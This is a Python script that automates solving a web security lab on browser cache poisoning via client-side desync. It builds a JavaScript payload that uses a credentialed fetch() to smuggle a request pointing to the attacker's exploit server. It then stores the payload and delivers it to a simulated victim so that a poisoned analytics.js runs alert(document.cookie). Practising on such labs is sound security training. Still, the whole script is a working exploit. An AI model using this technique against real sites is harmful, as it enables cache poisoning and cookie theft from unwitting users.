# Browser cache poisoning via client-side desync

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def store_payload(s, url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = s.post(store_exploit_path, data=store_exploit_data)
	time.sleep(1)
	deliver_exploit_data = {
			"formAction": "DELIVER_TO_VICTIM",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = s.post(store_exploit_path, data=deliver_exploit_data)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n\t%s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path + store_exploit_data["responseFile"])
	return r

def build_payload(url, attacker):
	payload_to_send = f"""alert(document.cookie);
/*
<script>
    const labURL = "{url}";
    const exploitHost = "{attacker}";
    if(window.name != 'skip'){{
        window.name = 'skip';
        fetch(`${{labURL}}/..%2f`, {{ method: 'POST', body: `GET //${{exploitHost}}/eXpLoIt HTTP/1.1\\r\\nFoo: x`, credentials: 'include', mode: 'no-cors' }}).then(() => {{location=`${{labURL}}/resources/js/analytics.js`}} );
    }} else {{
        window.name = '';
        location = `${{labURL}}/login`;
    }}
</script>
*/"""
	return payload_to_send

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv
	else:
		print("[-] Didn't find exploit server on the home page <!>")
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Usage: %s https://example.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Browser cache poisoning via client-side desync')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		print(parsed_url)
		subdomain = parsed_url.netloc
		exploit_srv = find_exploit_srv(r)
		attacker = urllib.parse.urlparse(exploit_srv).scheme + "://" + urllib.parse.urlparse(exploit_srv).netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url.scheme == "http":
			port = 80
		atk_url = urllib.parse.urlparse(attacker)
		print(atk_url)
		atk_domain = atk_url.netloc
		if atk_url.port:
			atk_port = atk_url.port
		elif atk_url.scheme == "https":
			atk_port = 443
		elif atk_url.scheme == "http":
			atk_port = 80
		url = parsed_url.scheme + '://' + subdomain
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		print("------------------------------------------------------")
		payload = build_payload(url, atk_domain)
		r = store_payload(s, url, payload, attacker)
		time.sleep(TIMEOUT)
		r = s.get(attacker + '/exploit')
		time.sleep(TIMEOUT)
		r = s.get(url)
		print(r)
		if 'Congratulations, you solved the lab!' in r.text:
			print('[+] The lab is solved !')
			solved = True

if __name__ == "__main__":
	main()
